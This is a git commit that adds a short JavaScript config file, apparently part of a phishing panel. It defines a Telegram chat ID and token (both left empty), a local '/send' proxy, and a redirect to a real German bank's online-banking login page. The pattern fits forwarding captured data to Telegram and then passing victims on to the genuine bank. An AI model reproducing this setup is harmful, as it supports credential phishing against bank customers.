a66a8771ec5842bb62e7c02320333bba6adb716b
Ax <145045609+ax529@users.noreply.github.com>
2026-04-10 13:27:52 +0200

    add

---
+++ panel/assets/js/telegram-config.js
@@ -0,0 +1,6 @@
+window.TRAINING_TELEGRAM = {
+  chatId: '',
+  proxyUrl: 'http://127.0.0.1:8787/send',
+  token: '',
+  successRedirectUrl: 'https://www.vrbank-eg.de/banking-und-vertraege/banking/banking-privatkunden/onlinebanking.html'
+};
